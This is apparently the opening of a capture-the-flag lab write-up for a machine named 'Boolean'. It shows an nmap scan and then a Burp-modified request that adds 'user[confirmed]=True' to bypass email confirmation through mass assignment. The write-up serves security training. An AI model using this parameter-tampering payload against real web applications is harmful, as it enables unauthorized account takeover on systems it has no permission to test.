##### Tags: `SUID`  `php`  `searchsploit`  `GTFOBin`

# 🐧Boolean🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.156.231
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 13:47 AEDT
Nmap scan report for 192.168.156.231
Host is up (0.22s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open   http
3000/tcp  closed ppp
33017/tcp open   http    Apache httpd 2.4.38 ((Debian))
```
There is a web login page  
We create a user and login as user  
Then click resend email
Use burpsuite to change the payload
```
Add this to the payload
&user%5Bconfirmed%5D=True
_method=patch&authenticity_token=_QlOu-myYsI4qa-ASLIILonpLq6osynvu13Pmk0nln3kFf28ppete5SOJVGvvx3FffC3obtJeveir0LXeEkudQ&user%5Bconfirmed%5D=True&user%5Bemail%5D=test%40test.com&commit=Change%20email
```
